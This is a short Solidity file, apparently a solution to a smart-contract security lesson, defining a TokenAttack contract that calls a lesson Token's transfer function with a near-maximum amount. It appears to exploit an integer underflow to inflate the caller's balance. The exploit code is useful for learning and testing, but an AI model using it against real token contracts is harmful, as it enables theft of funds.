// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "../lessons/05-Token.sol";

contract TokenAttack {
    Token token;

    constructor(address tokenAddress) public {
        token = Token(tokenAddress);
    }

    function attack() public {
        uint256 attackerBalance = token.balanceOf(msg.sender);
        uint256 MAX_INT = 2**256 - 1;
        token.transfer(msg.sender, MAX_INT - attackerBalance);
    }
}
